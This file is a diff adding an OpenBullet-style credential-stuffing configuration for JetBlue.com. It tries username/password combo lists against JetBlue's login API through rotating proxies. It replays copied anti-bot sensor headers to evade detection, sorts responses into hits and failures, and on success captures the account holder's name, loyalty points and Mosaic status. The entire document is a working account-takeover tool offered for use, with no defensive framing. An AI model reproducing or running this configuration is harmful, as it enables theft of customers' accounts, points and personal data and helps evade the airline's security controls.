@@ -1,0 +1,86 @@
+[SETTINGS]
+{
+  "Name": "JetBlue.com",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-10T07:49:13.7284229-04:00",
+  "AdditionalInfo": "Rotating Proxies Needed",
+  "Author": "Cr5te",
+  "Version": "1.4.3 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://jbrest.jetblue.com/iam/login" 
+  CONTENT "{\"id\":\"<USER>\",\"pwd\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Referer: https://www.jetblue.com/signin?returnUrl=https:%2F%2Fwww.jetblue.com%2F" 
+  HEADER "X-1ItxWO9i-b: vonm6s" 
+  HEADER "X-1ItxWO9i-c: AKAi32NxAQAA2Trhke1TjyIUPAfMKymdijTMN0OqSooBp2JNnMh6X2q7FKfM" 
+  HEADER "X-1ItxWO9i-d: o_0" 
+  HEADER "X-1ItxWO9i-f: A59e32NxAQAAFwxRuOeFD82PrxFOE-rc6deFfc9YWvmLYrrtFYZ9JO7D_EZzAUJsPi6uchShwH8AAEB3AAAAAA==" 
+  HEADER "X-1ItxWO9i-z: p" 
+  HEADER "X-B3-SpanId: 6b67c4a7c0179462" 
+  HEADER "X-B3-TraceId: 629deae12feae701" 
+  HEADER "X-1ItxWO9i-a: mq4I4znGBZdEvlzdz4SlotcZXJtzSUPOLBoCMMm4QAEgF2oIUga3rVZbx_S06hWtZ3K1sZ3T4TDTJKdVf_OVeiY_MccsGuj38OF7H1l0usU3raJLHdgFJB6=am7IQPf=cfw_=y9dfyHEbOru5d8wcsG0_hi1qqRX5d=YVvkGbSwstcCKyWHwaObvMbouTZUduAtau5d_ih=QyN=P0caeXje0PGzacXQArqcf6O7_XS61skfDEq5kzkM0YHH3dK82ZhPbUscTDYZo91olhHxWIrkJh4osQIVITENwW9e52iqaJJZEfCEQNoV7Txv=irWP2Z8oMZOeC0ukqs3qHxC64ePR34p5OawKqBpcSxvZZekPhkr91Ei=gr3qJH7feVyy2iLOf0WzhZN5wDTRDg_8pPWP=xBbUnXTMY5LRx=jpxGwgOhkzh8upIyRWgCVOcTqTo27jWpfYTNfHuFFpFzdQ9pkrrq78WG6BzGO6X8PvwQ3UzzzZm2=5S4AV5YZ32gri4Yslceh06Oe4Z4S8ET0HLPQHungnjJs8bOvpALiumkjmgXBY8lkFqX7Y9ELkV4mwZaZKELvk6ZtcytYQvo0GvKSkCVmsZAitKpQKYQn9C7bF6CBt4i8Hv=K0WOOMJr77F87PNLhGrjhKHr_IFJdWcde2JaVvOJ_GniiMP8UpNz5OWXhlIcU62awqWFBB=KOXyEcJwwQ4TH94tTKMBxOLgyWQ4rNFS5dzu5Ffb6hM1zF4_TeOEyZy66a4A6b=xNu=Nk9XoG4e1IzCIrX7crjG0h=pt5Tc2ud=XqRY0BEqoAE7Kk6dv62S_OOQJ6JbGiIr0iWvQ8NaGSbYf=OOIl7OThsZokt30d_YToF0utQiV7pISjm0nWeJuatNRwO=g24DeQGhxOqQE8P5nPuzgG050Co6EaeVLhlcoa9YyP2DwNkunXl9XYG0FNYArO8by4NTaw7SM40JHCE5G6=ktfITnjgUMApY=Ktyibz7DcZG9xOSWKb9IzbMq0_6RYQZLt02KeOhWDHUUTlXz7cM6HcEuoTjJo223mYzzmO3kld0trU70aLahnOrU9YS7NnxjG9YncagzsTNq7uxz0yVyfBHsjf9MpKsbtgAh132EaeWWGplssUGCERuie8_6_vBmiMtTWgsjq7wRYwM=EGQb61JvJinkM9_iy8BKB4dIBfvhi8lmqjsh1eu9nhCw8NI6jREkiiGwAu4gHexJgPA3vmx633lHSCPlxqEnrDBFi1KB1tGskRkAjnUuYVTRUgbHu_bRfJdtxR1wZMCkJp768P7gdHKMuja0VAJI5Xnr2ypEjinGL277cxtqY0T37Zu9v4ycDtF6QQHLCSxwEZtMmSu79ohBW24FZxOczqg1_gBOppTzIAviEAeTYBCrfCH2=aTp8DbH8Zhu=zje312IDyky8xd=f0TKwEUrAbQLlK=CsatpBC5__Df8nv40pU23VgCxg103Xa0761uKrfPUmkh28k82zMQ=4MqV7COPBgXnEWTb8CR=gxiQVJMG2bPSVxM_djwhRuv6U3KObw5K06pW4jACu=AIJBEpsxgpRirxirxHWsDyMvO4JWzU7Y0kLubEexcI3baH2Ol4Qq5VKdSek13b_Pf7ckW7XKjkYRZiPu2LHYGPg6g3pbLVEgicG7Zjm6FVLEgvyDBGIYlEcefadiEX9SvK46Swq3ZWDAKlAT7uMEn_te_xbhFtiAUziRyxS4AFYos0slJoixeqkdOcI=36=jfYX_DQJ3hRW2imLwUkYtjTJqp97MEdWO7hc9lEr8w7RoK9AV3u3mY9gJSt2Z7WdoQB6Qj3TIdVvODkSLWbS5JHuu1_3J=MpRTPkbrmMnPG8KUjbj1yaE40Tk83NGQ=Gd_E9myP_K_gA9aF5FrqJLYuHmFczD50vTEuWocXacdRzhDAtNKe9TNU4nJZFHqQKaA6AL8nqHCt8f8pQDnqLLhQsY_LMbyfYJGtknM=KZNVzD65InjnI=fAQifhVILgSPe8PQVE5n3FVHN7Foeg318NkxYbgpqHuXwelk=HOBaWWRrcX97ZM1PRI6ShaG5PbVVj7=cgIdzuigA5fwHbXC4cHqqoH_IoE58hynD8TKtQMzTFlB23bwk83BGjL054z7tayzr7lz3jms0Vz2mLwloF_y_1Rvb7ir_wKIu_Ym0S29sHKU1ApfvKzF7NqCQpaCXVuPEBqa6UUW67RhgPNuaMFCtgf7llxsbaod3gVSMMlY8hxqKTQHTZQduUhiVOU12SSwBK61sIuUUFam9Pv4KO9gZkEgtsMGUDzfTZs1onnLTUbU46XL67MlswGhXgukb5EUNSm2H81cM_0KLzt60fkPwxeIFOX7cmfauFDEda31q1y7rEsoViYCbbqtUPuFJGiaH1XQ8Tg0Zjj5dFie2kS=C70LYla65HVWO9yAEq3oKla02zo8N4ImVDAxAhzR0E9biwpDgCgA9O0iOG60IS9ovIUMIB9PfV71xmppvVMYTO1aeUj5Q4u3AYgTXI29LbcmeAPhGuFLsSAQeIhC3nmPJN4SNXTOhuKZ5ivI=H6pWAPqNNfLiNNPr6QgUmPhpHwwoC90DOoxlm2Km6GUZG=RX7jMSDRKMyC77nIIVFoVTL1vdgYKigeWqJBQWMQYUKjjBv7pjpVxw0A7qyiIYw2YXT=dB5NSUB2oq7j4VWvHsRhmNqwQ_8smZcwLkTaNzIUHCKCVDBs9hInSGmhWydeppq2fnDpAqLYF2_qMN6bzbq819=yPwx1S_Jpg7VOw7BwE7aDQlw9FcxaxWQWMjeuBtlpyIxjfsl412bJuOk7LT3wM48qWl=ahpFnG5QhnUGc0C7PJZCtTVFhoJdRYP8wxil6XPMX9fn7m0JZImKl4nXQGGBpTqArwzPlhgqecp0wZ8tajbpTNLzJND4Dc8jGXDG39tfnsvmpUbuY7Vafm5IaOA5s59RsMW2qfhjaa_LHrq9mRDaRoASpnHBVa9L_FK75XB11akcbq2CKIYV2WaDdFALf=DP3SephNUB8X0a4Gfbm9xZH5hLYdah9h3Pl1tS=5s=vh3bGWlxDJ3dNMUmksRUdlpZdz8GUz55URbFBPjRt2Duz1t_zEglzHr5yDkngZCMkBsC0yrgb9foJpj_BY4iTum1ymcMLrtoNgD=86x6NafjAqNan23RkWrT6b6k8e9FYJSbkyiys_uXncb0d8vf=ZPIUkfA5J7GA8mce91R_Ng6hKHgRcQHS1FDNOxZVPzkr3heTeZqHODw9osDgL2lVO3ok79jLex6PiCb36yKpbs6inAKU6ZnGjdW0g3afLtpv2GesZoKzTeSPEXlpymIX95I1N=zpeDrrO5uAc2=G7lv7FEBHBFESNNkJyQH6fNs=m3d4FHpFU91LK47HqETyrdAXlH3YoIxfYU=mXHkaZHOmQN9Ru0043jlL_YNwZjHmH=Yb8xHq8ipM1WmNt6DN33HTH0ZV5xb2tkkvw6qWBza6tPtgdtLTN=gw_HQI=1riaEpx3Jxx1mt7k_3lYxsrsidEMpdKTL4iI2RQ04cOYk=k7Bf9sjA03ULd9l9OOFTxk0UmI2K0XwcJKJRvhfyk7Nb_3cvSKEccSktk09Zr8qNI85HC3zEkcbO3HewGdM7pHAZtIQ1=c1Xn5UtggVzRzsKdOb3PhEI99UtIPWmz3_hc8fxLbn5sB4ayenjKl_=OcEk5BEUBdNHx3u7IGgvLGXA2=VPAb238TSACy07aHdlclmAt1Z2MUAFB3nSnIGDYqPVc5oGzo5CZITtr4mI=UaITyUA0ooG1iIibfynaE=7mY7D82VMmeivEPpvT1RrTnftIeACfUUn690zikhehH=ciU=f9J4yjuu7TQOO=IIiiSWsf9YvQvmviXYIlUgabo2fBHLjaS0UCxucJB8C8gFz38AhWyxxDYDGqy9TO9pL0K9xQKWU=40pTWNqm31b2FsuLatgXBFpgq5TPOOY=PRpWJG0FRgYyQ9DQXifl9_LrNbw_Su3C0qg1oBu9fh2x=vk8fD6Rbf8CHvCxSBdJ_ofHV_3wl7id95KHU4d4tOtocMsVQJmneM0l10kp64D8ofoWf=IVeu=ML8IHQpccedZZZghUYfpb=VKtCJmpTWIuaDbidxL5zRrfn2f_CA_9wFeurgs8dYOkhkhjSEUzHizmuyPdnsOnmRXLlMuHgIWAL3ueCe7_axboQKm_4rteyT9wFZcz8uWRb6Nclkzo9DgFqF0NAUEmms1FPL3TKBQTopyVDJH3T_q6LNsIJZ5zlNQjDxJmHUoCM9ErCAXbIu8g7w55ADsz3kVYhqJxFJYpsokbDUrDGNkupIqiijy4YO1uTVfh3JtnWsYYGEUgqv5SwcUz17OPg_awpWk9HtynVLqu6hleH0uW86pbyAJNlMwolKPguSCvqm6FYUFe1q6k61HFn4pHm=bGlRdTPYcIkP1izYiSc2XOgpoYnPsL7=RlENmDWtVuTux8Ca4wSBx7ZMSE0jewCX1w9V23O9npjVFyQBTzgxZutPpQv1g3WxGndgjXR8cFtLn2uHBxWw9da438dQ4d_He2NaygEuKGvOTbDRSaacMCnCn9gdYqBHLVGaAw3FXIymBIEYR2vYvjhHavjX4CkTILdpcD7fL6GHT8z4wBCSa9gORY=7cuzIPq67q7zH51ZrnJWVTTFifDakAK9ahy9LaVph8h2b2D6NOUPfmBSSKSBHMIwe6yRtpyk8X1XYSARMGQo5cc2wF8sJ_jr_a8v9X8LJYoTJqXhrFxU_xLjh_wSgCq3M6A2k53IMM66cveP=x5PzRh1QJ4YPGqK15yCeEcGV_dFKDzrYxpBDKjOh5FkTaJdzxiqzYsniF3vmGD2LtVefwb1KbeVgNf9xtZ=PcP=wO51EaJDVmscECzUDoJi4UvJ3_fMn8buZzZ3p5D1PNyDLbVwDxB7Hvj8l98elWcbmDKlnnZXyWAMMM8reEk5RHH5gBUtBeTetQ1NSehTYlLTV8Pw1HdbZ9vQ07CEYk4ROWcVuBohLNk3Qwe_ece9yEO9f83qtS_Dul2s5SSgJQEDFg=bW_syy6sRn8ih8Cg8V3ei=hz0Zm1t6zNkM5l65YPqZJEvkSSwYHVmBWHY5owm1VWHx=ggv0lS6uoOkrsLG7Ne4KtfnXy=aVJJRMekeejnKiY0KBbGE9NgFCbbBaJe9maHBempC3Dw_hQHdzTAunywEZVNskZKi1McaZetEFpdMophhwEJWF4qHMaX9AFFWE9N8hrkuL0HQprNW8tDyXeF3lMzfWLTzDi5b2osM=6cqjXWho1TE1EHSm5jv0IaykGHwxQGk3YXgYl402zhEAbP6jDq_HoOk_kTOLOXfnq7awz677P=PPDLJqxsuieKag7gM_GXZfBIsuCrWV_fi3_=ry_Cv3v1VYCI2lakER0q7fQF0UeUP3dLp4=DJqais36a3Z=cdTxdUlTdUBkiHtUfWiTOMiIWJxZMTL457=NA8b=2iClX0jnY13Whh2JmLz4yReRl13jmjP_0SRB0IRbjaFTN_y_YAzSlVuwFD9yjn6F9ym49Ua0gWA7iHKDiTX8E1BWik8Rsu0dFRpE=19xgIN7miwQRjFm2dcuVI0OQplObwNlJltsMwcopxgxDFh7Eg_HxAq=vQSUp7m8hAQywZLsiTnIUzu9UOyb3jfAnKeI7OqnxVTRXwamNHe7InAAWygXP2zo4bCnSRCSRLijuRN37u63JRVFeb04guQCy8EMDrSBE8kTVNVBTy3kCemZ5Qo9b1eJGiXdg=rV3ABT5zdQ8V5J_gIa8OAJO2=f4X_YqM6L492sUUrHsqvQDjiVfHb3EtiRXELZXuzehicK_onfMXmqKovfLh3Yd0GszPTJf=3RqfS4TmCyI7z=NBbyo7j1Q9eGiok_0f_pTkA2tI6b_kFJIJ5g5geS3PwBO_nqpGxbNoMaBfhn0Q==YNy5XF9YvGYqhp4AaYBVaN3ZX5Vnqro_JV=DOIgIkPrjffvECsnHtiA0WrjWudmtW4r8TnfKE4gqubtmTsybu7Hpyosxida2=_oq3" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY ",\"name\":\"" 
+    KEY "\",\"membershipid" 
+  KEYCHAIN Failure OR 
+    KEY "{\"error\":{\"" 
+    KEY "\":\"Invalid credentials\"" 
+  KEYCHAIN Retry OR 
+    KEY "{ \"error\": { \"httpStatus\": \"401\", \"code\": \"JB_INVALID_CREDENTIALS\", \"message\": \"Invalid credentials\", } }" 
+
+#Points_Capture PARSE "<SOURCE>" LR "{\"points\":" ",\"" CreateEmpty=FALSE -> CAP "Points" 
+
+#FirstName PARSE "<SOURCE>" LR "fname\":\"" "\",\"" CreateEmpty=FALSE -> CAP "FirstName" 
+
+#LastName PARSE "<SOURCE>" LR "lname\":\"" "\",\"membershipid" CreateEmpty=FALSE -> CAP "LastName" 
+
+#IsMosaic PARSE "<SOURCE>" LR "isMosaic\":\"" "\",\"" CreateEmpty=FALSE -> CAP "Mosaic" 
+
